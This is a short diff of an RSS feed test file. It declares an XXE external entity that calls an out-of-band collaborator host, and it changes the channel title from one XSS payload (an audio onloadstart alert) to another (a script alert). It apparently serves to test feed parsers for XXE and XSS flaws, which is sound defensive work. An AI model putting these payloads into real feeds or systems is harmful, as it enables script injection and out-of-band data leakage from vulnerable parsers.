@@ -3,7 +3,7 @@
 <!ENTITY xxe SYSTEM "http://ig2saxscwn5oluub82rf7he2atgj48.cigitalcollaborator.com/aswd" >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
-    <title><audio src onloadstart=alert(111)></title>
+    <title><script>alert(111)</script></title>
     <link>http://example.com/</link>
     <description>A blog about things</description>
     <lastBuildDate>Thu, 11 Jun 2020 00:00:00 -0000</lastBuildDate>
